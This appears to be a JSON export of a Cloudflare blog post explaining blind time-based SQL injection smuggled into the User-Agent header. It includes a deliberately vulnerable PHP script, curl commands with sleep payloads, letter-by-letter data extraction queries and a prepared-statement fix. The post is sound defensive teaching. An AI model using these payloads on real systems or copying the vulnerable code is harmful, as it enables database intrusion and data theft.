{
	"locale": "en-us",
	"post": {
		"access": true,
		"authors": [
			{
				"id": "5d1644b141acde0011a94f2c",
				"name": "John Graham-Cumming",
				"slug": "john-graham-cumming",
				"profile_image": "http://blog.cloudflare.com/content/images/2017/03/url-2.jpg",
				"cover_image": "http://blog.cloudflare.com/content/images/2023/05/Twitter-Header-@cloudflare-US.png",
				"bio": null,
				"website": null,
				"location": "Lisbon, Portugal",
				"facebook": null,
				"twitter": null,
				"meta_title": null,
				"meta_description": null,
				"url": "http://blog.cloudflare.com/author/john-graham-cumming/"
			}
		],
		"canonical_url": null,
		"codeinjection_foot": null,
		"codeinjection_head": null,
		"comment_id": "4808",
		"comments": false,
		"created_at": "2016-05-17T11:40:23.000+01:00",
		"custom_excerpt": "From time to time a customer writes in and asks about certain requests that have been blocked by the CloudFlare WAF. Recently, a customer couldn’t understand why it appeared that some simple GET requests for their homepage were listed as blocked in WAF analytics.",
		"custom_template": null,
		"email_subject": null,
		"excerpt": "From time to time a customer writes in and asks about certain requests that have been blocked by the CloudFlare WAF. Recently, a customer couldn’t understand why it appeared that some simple GET requests for their homepage were listed as blocked in WAF analytics.",
		"feature_image": "http://blog.cloudflare.com/content/images/2018/08/4813392151_410cf9a73b_z.jpg",
		"feature_image_alt": null,
		"feature_image_caption": null,
		"featured": false,
		"frontmatter": null,
		"html": "<!--kg-card-begin: markdown--><p>From time to time a customer writes in and asks about certain requests that have been blocked by the CloudFlare <a href=\"https://www.cloudflare.com/waf/\">WAF</a>. Recently, a customer couldn’t understand why it appeared that some simple GET requests for their homepage were listed as blocked in WAF analytics.</p>\n<p>A sample request looked liked this:</p>\n<pre><code>GET / HTTP/1.1\nHost: www.example.com\nConnection: keep-alive\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.1; Win64; x64; Trident/5.0)'+(select*from(select(sleep(20)))a)+' \nAccept-Encoding: gzip, deflate, sdch\nAccept-Language: en-US,en;q=0.8,fr;q=0.6\n</code></pre>\n<p>As I said, a simple request for the homepage of the web site, which at first glance doesn’t look suspicious at all. Unless your take a look at the <code>User-Agent</code> header (its value is the string that identifies the browser being used):</p>\n<pre><code>Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.1; Win64; x64; Trident/5.0)'+(select*from(select(sleep(20)))a)+\n</code></pre>\n<p>The start looks reasonable (it’s apparently Microsoft Internet Explorer 11) but the agent strings ends with <code>'+(select*from(select(sleep(20)))a)+</code>. The attacker is attempting a <a href=\"https://en.wikipedia.org/wiki/SQL_injection\">SQL injection</a> inside the <code>User-Agent</code> value.</p>\n<p>It’s common to see SQL injection in URIs and form parameters, but here the attacker has hidden the SQL query <code>select * from (select(sleep(20)))</code> inside the <code>User-Agent</code> HTTP request header. This technique is commonly used by scanning tools; for example, <a href=\"http://sqlmap.org/\">sqlmap</a> will try SQL injection against specific HTTP request headers with the <code>-p</code> option.</p>\n<h3 id=\"youaregettingverysleep\">You are getting very sleep</h3>\n<p>Many SQL injection attempts try to extract information from a website (such as the names of users, or their passwords, or other private information). This SQL statement is doing something different: it’s asking the database that’s processing the request to sleep for 20 seconds.</p>\n<p><img src=\"http://blog.cloudflare.com/content/images/2016/05/4036024362_8752bea514_z.jpg\" alt=\"\" loading=\"lazy\"><br>\n<small><a href=\"https://creativecommons.org/licenses/by-sa/2.0/\">CC BY-SA 2.0</a> <a href=\"https://www.flickr.com/photos/vancouverlaser/4036024362/in/photolist-79DFqW-6bgKJ-hgsZxu-cp4c1Q-6miL6P-m4i1Xp-dxPs8E-8mCoyF-3BFYxy-kLLfcD-c12jub-niAXry-bAubec-ou2BkV-nom5Ly-k3Asnv-e5x4Lz-pYmu5c-nBWZAv-75BDDM-oBkwMY-8ZRzKS-h66fwy-p8adfb-s36TNQ-ejtuw9-nDUYFd-8uKeGF-qhtCL4-6RsCFn-3p1HAG-2MfZ7x-e5x65R-inNGRD-nAbCjW-h66xXW-awx1PJ-8iGb58-nTv2E6-p7cUnR-m4tfVT-nm4KwK-nxqyyb-pYrWxE-9J3x8y-nrB4VY-apoiVi-iMCsos-pQXzae-dUoEYW\">image</a> by <a href=\"https://www.flickr.com/photos/vancouverlaser/\">Dr Braun</a></small></p>\n<p>This is a form of <a href=\"https://www.owasp.org/index.php/Blind_SQL_Injection\">blind SQL injection</a>. In a common SQL injection the output of the SQL query would be returned to the attacker as part of a web page. But in a blind injection the attacker doesn’t get to see the output of their query and so they need some other way of determining that their injection worked.</p>\n<p>Two common methods are to make the web server generate an error or to make it delay so that the response to the HTTP request comes back after a pause. The use of <code>sleep</code> means that the web server will take 20 seconds to respond and the attacker can be sure that a SQL injection is possible. Once they know it’s possible they can move onto a more sophisticated attack.</p>\n<h3 id=\"example\">Example</h3>\n<p>To illustrate how this might work I created a really insecure application in PHP that records visits by saving the <code>User-Agent</code> to a MySQL database. This sort of code might exist in a real web application to save analytics information such as number of visits.</p>\n<p>In this example, I’ve ignored all good security practices because I want to illustrate a working SQL injection.</p>\n<p><strong>BAD CODE: DO NOT COPY/PASTE MY CODE!</strong></p>\n<p>Here’s the PHP code:</p>\n<pre><code>&lt;?php\n\n$link = new mysqli('localhost', 'insecure', '1ns3cur3p4ssw0rd', 'analytics');\n\n$query = sprintf(&quot;INSERT INTO visits (ua, dt) VALUES ('%s', '%s')&quot;,\n       $_SERVER[&quot;HTTP_USER_AGENT&quot;],\n       date(&quot;Y-m-d h:i:s&quot;));\n\n$link-&gt;query($query);\n\n?&gt;\n\n&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;b&gt;Thanks for visiting&lt;/b&gt;&lt;/body&gt;&lt;/html&gt;\n</code></pre>\n<p>It connects to a local MySQL database and selects the <code>analytics</code> database and then inserts the user agent of the visitor (which comes from the <code>User-Agent</code> HTTP header and is stored in <code>$_SERVER[&quot;HTTP_USER_AGENT&quot;]</code>) into the database (along with the current date and time) without any sanitization at all!</p>\n<p>This is ripe for a SQL injection, but because my code doesn’t report any errors the attacker won’t know they managed an injection without something like the sleep trick.</p>\n<p><a href=\"https://xkcd.com/327/\"><img src=\"http://blog.cloudflare.com/content/images/2016/05/static_qr_code_without_logo.jpg\" alt=\"\" loading=\"lazy\"></a></p>\n<p>To exploit this application it’s enough to do the following (where <code>insecure.php</code> is the script above):</p>\n<pre><code>curl -A &quot;Mozilla/5.0', (select*from(select(sleep(20)))a)) #&quot; http://example.com/insecure.php\n</code></pre>\n<p>This sets the <code>User-Agent</code> HTTP header to <code>Mozilla/5.0', (select*from(select(sleep(20)))a)) #</code>. The poor PHP code that creates the query just inserts this string into the middle of the SQL query without any sanitization so the query becomes:</p>\n<pre><code>INSERT INTO visits (ua, dt) VALUES ('Mozilla/5.0', (select*from(select(sleep(20)))a)) #', '2016-05-17 03:16:06')\n</code></pre>\n<p>The two values to be inserted are now <code>Mozilla/5.0</code> and the result of the subquery <code>(select*from(select(sleep(20)))a)</code> (which takes 20 seconds). The <code>#</code> means that the rest of the query (which contains the inserted date/time) is turned into a comment and ignored.</p>\n<p>In the database an entry like this appears:</p>\n<pre><code>+---------------------+---------------+\n| dt                  | ua            |\n+---------------------+---------------+\n| 0                   | Mozilla/5.0   |\n+---------------------+---------------+\n</code></pre>\n<p>Notice how the date/time is <code>0</code> (the result of the <code>(select*from(select(sleep(20)))a)</code>) and the user agent is just <code>Mozilla/5.0</code>. Entries like that are likely the only indication that an attacker had succeeded with a SQL injection.</p>\n<p>Here’s what the request looks like when it runs. I’ve used the <code>time</code> command to see how long the request takes to process.</p>\n<pre><code>$ time curl -v -A &quot;Mozilla/5.0', (select*from(select(sleep(20)))a) #&quot; http://example.com/insecure.php\n* Connected to example.com port 80 (#0)\n&gt; GET /insecure.php HTTP/1.1\n&gt; Host: example.com\n&gt; User-Agent: Mozilla/5.0', (select*from(select(sleep(20)))a) #\n&gt; Accept: */*\n&gt;\n&lt; HTTP/1.1 200 OK\n&lt; Date: Mon, 16 May 2016 10:45:05 GMT\n&lt; Content-Type: text/html\n&lt; Transfer-Encoding: chunked\n&lt; Connection: keep-alive\n&lt; Server: nginx\n\n&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;b&gt;Thanks for visiting&lt;/b&gt;&lt;/body&gt;&lt;/html&gt;\n* Connection #0 to host example.com left intact\n\nreal   0m20.614s\nuser   0m0.007s\nsys    0m0.012s\n</code></pre>\n<p>It took 20 seconds. The SQL injection worked.</p>\n<h3 id=\"exploitation\">Exploitation</h3>\n<p>At this point you might be thinking “that’s neat, but doesn’t seem to enable an attacker to hack the web site”.</p>\n<p>Unfortunately, the richness of SQL means that this chink in the <code>insecure.php</code> code (a mere 3 lines of PHP!) lets an attacker go much further than just making a slow response happen. Even though the <code>INSERT INTO</code> query being attacked only writes to the database it’s possible to turn this around and extract information and gain access.</p>\n<p><img src=\"http://blog.cloudflare.com/content/images/2016/05/4813392151_410cf9a73b_z.jpg\" alt=\"\" loading=\"lazy\"><br>\n<small><a href=\"https://creativecommons.org/licenses/by/2.0/\">CC BY 2.0</a> <a href=\"https://www.flickr.com/photos/schill/4813392151/in/photolist-8kkTMR-bUTUKK-8FBu6H-pVRDno-7xXSxj-78ePNM-dEBQ1Z-r2ouJ-apHUxy-9yNrec-5A9bu9-pEvMok-5A4UmF-5GU2A9-dRweT2-9YVh9-5GU2zo-8PBLrM-8PBqxv-81AwZa-7w3oG3-7Nfb9c-got9Ti-dRezcB-6GNKrM-5A4Ub2-cdM6PJ-5A4Uwv-5GPJYg-D5coqS-5A9bEY-5GPJVX-8kKDCP-91N2sr-49XqW-3eKNbN-8ohQ4f-Cn1mG-ciNZdd-4CMtNC-DhQ2M-yoMGq-N1HP8-88YcCu-t2ruTe\">image</a> by <a href=\"https://www.flickr.com/photos/schill/\">Scott Schiller</a></small></p>\n<p>As an illustration I created a table in the database called <code>users</code> containing a user called root and a user called <code>john</code>. Here’s how an attacker might discover that there is a <code>john</code> user. They can craft a query that works out the name of a user letter by letter just by looking at the time a request takes to return.</p>\n<p>For example,</p>\n<pre><code>curl -A &quot;Mozilla/5.0', (select sleep(20) from users where substring(name,1,1)='a')) #&quot; http://example.com/insecure.php\n</code></pre>\n<p>returns immediately because there are no users with a name starting with <code>a</code>. But</p>\n<pre><code>curl -A &quot;Mozilla/5.0', (select sleep(20) from users where substring(name,1,1)='j')) #&quot; http://example.com/insecure.php\n</code></pre>\n<p>takes 20 seconds. The attacker can then try two letters, three letters, and so on. The same technique can be used to extract other data from the database.</p>\n<p>If my web app was a little more sophisticated, say, for example, it was part of a blogging platform that allowed comments, it would be possible to use this vulnerability to dump the contents of an entire database table into a comment. The attacker could return and display the appropriate comment to read the table's contents. That way large amounts of data can be exfiltrated.</p>\n<h3 id=\"securingmycode\">Securing my code</h3>\n<p>The better way to write the PHP code above is as follows:</p>\n<pre><code>&lt;?php\n\n$link = new mysqli('localhost', 'analytics_user', 'aSecurePassword', 'analytics_db');\n\n$stmt = $link-&gt;prepare(&quot;INSERT INTO visits (ua, dt) VALUES (?, ?)&quot;);\n$stmt-&gt;bind_param(&quot;ss&quot;, $_SERVER[&quot;HTTP_USER_AGENT&quot;], date(&quot;Y-m-d h:i:s&quot;));\n$stmt-&gt;execute();\n\n?&gt;\n\n&lt;html&gt;\n&lt;head&gt;&lt;/head&gt;\n&lt;body&gt;&lt;b&gt;Thanks for visiting&lt;/b&gt;&lt;/body&gt;\n</code></pre>\n   </html>\n<p>This prepares the SQL query to perform the insertion using <a href=\"https://secure.php.net/manual/en/mysqli.prepare.php\"><code>prepare</code></a> and then binds the two parameters (the user agent and the date/time) using <a href=\"https://secure.php.net/manual/en/mysqli-stmt.bind-param.php\"><code>bind_param</code></a> and then runs the query with <a href=\"https://secure.php.net/manual/en/mysqli-stmt.execute.php\"><code>execute</code></a>.</p>\n<p><code>bind_param</code> ensures that the special SQL characters like quotes are escaped correctly for insertion in the database. Trying to repeat the injection above results in the following database entry:</p>\n<pre><code>+---------------------+----------------------------------------------------+\n| dt                  | ua                                                 |\n+---------------------+----------------------------------------------------+\n| 2016-05-17 04:46:02 | Mozilla/5.0',(select*from(select(sleep(20)))a)) #  |\n+---------------------+----------------------------------------------------+\n</code></pre>\n<p>The attacker's SQL statement has not turned into a SQL injection and has simply been stored in the database.</p>\n<h3 id=\"conclusion\">Conclusion</h3>\n<p>SQL injection is a perennial favorite of attackers and can happen anywhere input controlled by an attacker is processed by a web application. It's easy to imagine how an attacker might manipulate a web form or a URI, but even HTTP request headers are vulnerable. Literally any input the web browser sends to a web application should be considered hostile.</p>\n<p>We saw the same attacker use many variants on this theme. Some tried to make the web server respond slowly using SQL, others using Python or Ruby code (to see if the web server could be tricked into running that code).</p>\n<p>CloudFlare's WAF helps mitigate attacks like this with rules to <a href=\"https://www.cloudflare.com/learning/security/threats/how-to-prevent-sql-injection/\">block injection of SQL statements</a> and code.</p>\n<!--kg-card-end: markdown-->",
		"id": "5d16453b41acde0011a955a1",
		"meta_description": null,
		"meta_title": null,
		"og_description": null,
		"og_image": null,
		"og_title": null,
		"primary_author": {
			"id": "5d1644b141acde0011a94f2c",
			"name": "John Graham-Cumming",
			"slug": "john-graham-cumming",
			"profile_image": "http://blog.cloudflare.com/content/images/2017/03/url-2.jpg",
			"cover_image": "http://blog.cloudflare.com/content/images/2023/05/Twitter-Header-@cloudflare-US.png",
			"bio": null,
			"website": null,
			"location": "Lisbon, Portugal",
			"facebook": null,
			"twitter": null,
			"meta_title": null,
			"meta_description": null,
			"url": "http://blog.cloudflare.com/author/john-graham-cumming/"
		},
		"primary_tag": {
			"id": "5d16450341acde0011a951a5",
			"name": "WAF Rules",
			"slug": "waf-rules",
			"description": null,
			"feature_image": null,
			"visibility": "public",
			"meta_title": null,
			"meta_description": "WAF Rules (EN)",
			"og_image": null,
			"og_title": null,
			"og_description": null,
			"twitter_image": null,
			"twitter_title": null,
			"twitter_description": null,
			"codeinjection_head": null,
			"codeinjection_foot": null,
			"canonical_url": null,
			"accent_color": null,
			"url": "http://blog.cloudflare.com/tag/waf-rules/"
		},
		"published_at": "2016-05-17T14:07:33.000+01:00",
		"reading_time": 7,
		"slug": "the-sleepy-user-agent",
		"tags": [
			{
				"id": "5d16450341acde0011a951a5",
				"name": "WAF Rules",
				"slug": "waf-rules",
				"description": null,
				"feature_image": null,
				"visibility": "public",
				"meta_title": null,
				"meta_description": "WAF Rules (EN)",
				"og_image": null,
				"og_title": null,
				"og_description": null,
				"twitter_image": null,
				"twitter_title": null,
				"twitter_description": null,
				"codeinjection_head": null,
				"codeinjection_foot": null,
				"canonical_url": null,
				"accent_color": null,
				"url": "http://blog.cloudflare.com/tag/waf-rules/"
			},
			{
				"id": "5d16450341acde0011a951e6",
				"name": "WAF",
				"slug": "waf",
				"description": null,
				"feature_image": null,
				"visibility": "public",
				"meta_title": null,
				"meta_description": null,
				"og_image": null,
				"og_title": null,
				"og_description": null,
				"twitter_image": null,
				"twitter_title": null,
				"twitter_description": null,
				"codeinjection_head": null,
				"codeinjection_foot": null,
				"canonical_url": null,
				"accent_color": null,
				"url": "http://blog.cloudflare.com/tag/waf/"
			},
			{
				"id": "5d16450341acde0011a95238",
				"name": "SQL",
				"slug": "sql",
				"description": null,
				"feature_image": null,
				"visibility": "public",
				"meta_title": null,
				"meta_description": null,
				"og_image": null,
				"og_title": null,
				"og_description": null,
				"twitter_image": null,
				"twitter_title": null,
				"twitter_description": null,
				"codeinjection_head": null,
				"codeinjection_foot": null,
				"canonical_url": null,
				"accent_color": null,
				"url": "http://blog.cloudflare.com/tag/sql/"
			},
			{
				"id": "5d16450341acde0011a95265",
				"name": "Security",
				"slug": "security",
				"description": null,
				"feature_image": "http://blog.cloudflare.com/content/images/2020/10/Security.png",
				"visibility": "public",
				"meta_title": "Cloudflare Blog: Security",
				"meta_description": "Collection of Cloudflare blog posts tagged 'Security'.",
				"og_image": null,
				"og_title": null,
				"og_description": null,
				"twitter_image": null,
				"twitter_title": null,
				"twitter_description": null,
				"codeinjection_head": null,
				"codeinjection_foot": null,
				"canonical_url": null,
				"accent_color": null,
				"url": "http://blog.cloudflare.com/tag/security/"
			}
		],
		"title": "The Sleepy User Agent",
		"twitter_description": null,
		"twitter_image": null,
		"twitter_title": null,
		"updated_at": "2023-10-27T21:34:55.000+01:00",
		"url": "http://blog.cloudflare.com/the-sleepy-user-agent/",
		"uuid": "1c467431-5708-482b-9fac-b4578d98f63e",
		"visibility": "public"
	}
}